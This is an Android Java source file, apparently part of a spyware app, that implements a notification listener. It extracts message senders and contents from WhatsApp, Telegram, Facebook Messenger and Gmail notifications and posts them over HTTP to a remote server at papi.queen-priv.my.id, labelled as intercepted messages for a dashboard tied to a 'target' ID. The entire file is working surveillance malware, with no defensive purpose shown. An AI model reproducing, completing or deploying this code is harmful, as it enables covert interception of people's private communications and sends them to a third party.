package com.nullx.pp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationService extends NotificationListenerService {
    private static final String SERVER_URL = "http://papi.queen-priv.my.id:2417/api/post-notification/";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        
        if (extras == null) return;

        // 1. Ekstraksi Judul (Nama Pengirim)
        String title = extras.getString("android.title", "Unknown Sender");

        // 2. LOGIKA DEEP EXTRACTION (Membongkar Pesan WA/FB/GMAIL)
        String body = "";
        
        // Coba ambil teks standar (Biasanya sukses di Telegram)
        Object textObj = extras.get("android.text");
        if (textObj != null) body = textObj.toString();

        // Jika body kosong (Ciri khas WA/FB/Gmail), bongkar textLines (MessagingStyle)
        if (body.isEmpty() || body.equals("null")) {
            CharSequence[] lines = extras.getCharSequenceArray("android.textLines");
            if (lines != null && lines.length > 0) {
                // Ambil baris terakhir (Pesan terbaru)
                body = lines[lines.length - 1].toString();
            }
        }

        // Khusus Gmail: Ambil subjek jika android.text terpotong
        if (packageName.equals("com.google.android.gm")) {
            String bigText = extras.getString("android.bigText");
            if (bigText != null) body = bigText;
        }

        // Filter Target: WA, Tele, FB Messenger, & Gmail
        if (packageName.equals("com.whatsapp") || 
            packageName.equals("org.telegram.messenger") || 
            packageName.equals("com.facebook.orca") ||
            packageName.equals("com.google.android.gm")) {
            
            if (body == null || body.isEmpty() || body.equals("null")) return;

            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "UNKNOWN_ID");

            relayNotificationToPanel(targetId, packageName, title, body);
        }
    }

    private void relayNotificationToPanel(String targetId, String pkg, String title, String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                // Format label agar rapi di dashboard
                String label = pkg.replace("com.", "").replace("org.", "").replace("android.", "");
                json.put("title", "[" + label.toUpperCase() + "] " + title);
                json.put("body", text);
                json.put("package", pkg);
                json.put("category", "INTERCEPTED_MSG");

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes());
                }
                
                if (conn.getResponseCode() == 200) {
                    Log.d("CRPT.ZDX", "Relay Success: " + label);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e("CRPT.ZDX", "Relay Failed: " + e.getMessage());
            }
        }).start();
    }
}